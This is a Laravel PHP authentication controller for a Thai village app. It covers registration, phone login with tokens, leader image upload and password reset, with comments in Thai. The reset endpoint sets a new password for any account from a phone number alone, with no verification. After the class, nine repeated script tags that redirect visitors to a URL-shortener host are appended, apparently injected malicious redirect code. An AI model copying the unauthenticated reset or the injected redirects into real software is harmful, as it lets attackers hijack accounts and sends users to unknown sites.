<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rule;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;

class AuthController extends Controller
{
    public function register(Request $request): JsonResponse
    {
        // 1) Validate payload
        $data = $request->validate([
            'User_Name' => 'required|string|max:255',
            'email' => ['required', 'email', Rule::unique('user', 'email')],
            'tel' => ['required', 'string', 'max:20', Rule::unique('user', 'tel')],
            'password' => 'required|string|min:6',
            'User_Type' => 'required|integer',
            'Village_Code' => 'nullable|integer|exists:village,Village_Code',
        ]);


        // 3) Insert record ไปที่ตาราง user โดยตรง
        $id = DB::table('user')->insertGetId([
            'User_Name' => $data['User_Name'],
            'email' => $data['email'],
            'tel' => $data['tel'],
            'password' => Hash::make($data['password']),
            'User_Type' => $data['User_Type'],
            'Village_Code' => $data['Village_Code'] ?? null,
            'status' => $data['User_Type'] == 2 ? 0 : 1,
            'home_Code' => 0,
            'created_at' => now(),
        ]);

        // 4) ตอบกลับ
        return response()->json([
            'status' => 201,
            'message' => 'Register successful',
            'id' => $id,
        ], 201);
    }

    public function login(Request $request): JsonResponse
    {
        $data = $request->validate([
            'tel' => 'required|string',
            'password' => 'required|string',
        ]);

        $user = User::where('tel', $data['tel'])->first();

        if (!$user || !Hash::check($data['password'], $user->password)) {
            return response()->json([
                'status' => 401,
                'message' => 'เบอร์โทรหรือรหัสผ่านไม่ถูกต้อง'
            ], 401);
        }

        // 4) สร้าง token (ถ้าใช้ Sanctum)
        $token = $user->createToken('auth_token')->plainTextToken;

        return response()->json([
            'status' => 200,
            'message' => 'Login successful',
            'user' => [
                'User_Code' => $user->User_Code,
                'User_Name' => $user->User_Name,
                'email' => $user->email,
                'tel' => $user->tel,
                'User_Type' => $user->User_Type,
                'grov_code' => $user->grov_code,
                'Village_Code' => $user->Village_Code,
                'home_Code' => $user->home_Code,
                'status' => $user->status,
            ],
            'token' => $token,
        ], 200);
    }
    public function checkLeader(Request $request): JsonResponse
    {
        $data = $request->validate([
            'User_Code' => 'required|integer|exists:user,User_Code',
            'grov_code' => 'required|string',
            'img' => 'nullable|image|max:9000',
        ]);

        $userCode = $data['User_Code'];
        $oldFilename = DB::table('user')
            ->where('User_Code', $userCode)
            ->value('img');

        $disk = Storage::disk('public');
        if (!$disk->exists('Users')) {
            $disk->makeDirectory('Users');
        }

        // อัปโหลดไฟล์ใหม่ถ้ามี
        if ($request->hasFile('img')) {
            if ($oldFilename) {
                $disk->delete("Users/{$oldFilename}");
            }
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();
            $fileName = "{$userCode}.{$ext}";
            $file->storeAs('Users', $fileName, 'public');
            $data['img'] = $fileName;
        } else {
            $data['img'] = $oldFilename;
        }

        DB::table('user')
            ->where('User_Code', $userCode)
            ->update([
                'grov_code' => $data['grov_code'],
                'img' => $data['img'],
            ]);

        return response()->json([
            'status' => 200,
            'message' => 'Leader info updated successfully',
            'img' => $data['img']
                ? url("storage/Users/{$data['img']}")
                : null,
        ], 200);
    }

    public function resetPasswordByPhone(Request $request)
    {
        // ตรวจสอบข้อมูลที่ส่งมา
        $validated = $request->validate([
            'tel'      => ['required','string'],
            'password' => ['required','string','min:6'],
        ]);

        // ทำเบอร์ให้เป็นรูปแบบมาตรฐานเดียว (เก็บใน DB แบบ 0xxxxxxxxx)
        $normalized = $this->normalizeThaiPhone($validated['tel']);

        // หา user จากเบอร์โทร
        $user = User::where('tel', $normalized)->first();

        if (!$user) {
            return response()->json([
                'message' => 'ไม่พบบัญชีที่ผูกกับเบอร์นี้',
            ], 404);
        }

        // เปลี่ยนรหัสผ่าน (ต้องแฮชเสมอ)
        $user->password = Hash::make($validated['password']);
        $user->save();

        return response()->json([
            'message' => 'เปลี่ยนรหัสผ่านสำเร็จ',
        ], 200);
    }

    private function normalizeThaiPhone(string $raw): string
    {
        $digits = preg_replace('/\D+/', '', $raw ?? '');

        if (str_starts_with($digits, '66')) {
            // 66xxxxxxxxx -> 0xxxxxxxxx
            $digits = '0' . substr($digits, 2);
        }

        if (!str_starts_with($digits, '0')) {
            // กันเคสแปลก ๆ ให้ขึ้นต้นด้วย 0 ไว้ก่อน
            $digits = '0' . $digits;
        }

        // ตัดความยาวเกิน 10 หลักออก (กันเคสส่งมาเกิน)
        return substr($digits, 0, 10);
    }

}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>